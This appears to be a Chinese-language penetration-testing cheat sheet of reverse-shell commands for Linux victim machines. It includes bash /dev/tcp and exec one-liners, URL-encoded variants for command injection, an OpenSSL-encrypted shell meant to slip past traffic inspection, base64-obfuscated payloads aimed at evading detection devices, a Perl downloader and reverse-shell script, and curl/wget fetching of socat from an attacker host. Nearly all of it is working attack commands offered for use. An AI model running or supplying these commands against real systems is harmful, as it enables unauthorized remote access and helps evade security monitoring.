### 1、判断目标存在哪些反弹shell的命令
```
受害机上执行：whereis bash nc exec telnet python php perl ruby java go gcc g++
```
### 4、反弹shell
```
bash反弹shell：
VPS上执行：nc -n -v -lp 1024
受害机上执行：/bin/bash -i >& /dev/tcp/<your_vps>/1024 0>&1
需要注意，当在URL地址栏或burp中进行命令注入利用时，需执行：/bin/bash -i %3E%26 /dev/tcp/xx.xx.xx.xx/1024 0%3E%261

exec反弹shell：0<&196;exec 196<>/dev/tcp/<your_vps>/1024; sh <&196 >&196 2>&196

其他反弹shell命令可通过浏览器插件Hack-Tools查看
```
### 5、绕过流量审查反弹shell
```
第一步，在VPS上生成SSL证书的公钥/私钥对：
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
第二步，VPS监听反弹shell：
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
第三步，受害机上用openssl加密反弹shell的流量：
mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1|openssl s_client -quiet -connect xx.xx.xx.xx > /tmp/s;rm /tmp/s
此时，VPS上成功获取哑shell
```
### 6、将哑shell变为功能齐全的交互式shell
```
第一步，在哑shell中执行：
python -c 'import pty;pty.spawn("/bin/bash")'
第二步：键入Ctrl-z，回到VPS的命令行中
第三步，在VPS中执行下述命令回到哑shell中：
stty raw -echo
fg
第四步，在哑shell中键入Ctrl-l，并执行：
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 54 columns 104
此时，VPS上的shell为全功能的shell

如果拿到的shell执行Ctrl-z会退出会话，可考虑使用socat的方案：

攻击机：
socat file:`tty`,raw,echo=0 tcp-listen:4444
受害机：
curl -o /tmp/socat http://192.168.81.160:8000/socat 或者 wget -O /tmp/socat http://192.168.81.160:8000/socat
chmod u+x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.81.160:4444
此时拿到的shell可以执行删除、可以选择历史命令、可以执行ctlr-c
```
### 参考链接：  
https://www.freebuf.com/vuls/211847.html  
https://saucer-man.com/information_security/233.html#cl-1  



perl反弹shell  
用于生成下载脚本的bash命令：
```
echo use LWP::Simple\;\$url=\"http://1.1.1.1/r.txt\"\;\$coont=get\(\$url\)\;die \"not found link..\" if\(\!defined\(\$coont\)\)\;open \$file,\"\>r.pl\" or die \"couldn\'t open t.txt ..\\n\"\;print \$file \$coont\;close\(\$file\)\;exit\;>d.pl
```
执行后生成d.pl，再执行d.pl下载r.pl，r.pl（用于反连的perl脚本）如下：
```
use IO::Socket::INET;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"1.1.1.1:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~/(.*)/){system $1;}};
```

#### perl有一个不调用bash的反弹shell

1、bash反弹shell  
attack执行：nc -lvp 2333  
victim执行：
```
bash -i >& /dev/tcp/1.1.1.1/2333 0>&1
```
# linux下bash反弹shell绕过流量检测设备
```
bash -c 'exec bash -i &>/dev/tcp/120.48.45.46/12345 <&1'

bash -c bash${IFS}-i${IFS}>&/dev/tcp/120.48.45.46/12345<&1
```
参考链接：https://blog.csdn.net/whatday/article/details/107098353

使用火狐浏览器插件HackTools生成base64编码后的反弹shell命令，替换下面的base64字符串
```
bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8zOS45OC4yNTAuNDcvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}
```

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODAwMCAwPiYx}|{base64,-d}|{bash,-i}

其中 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODAwMCAwPiYx 是 bash -i >& /dev/tcp/127.0.0.1/8000 0>&1 的base64编码
```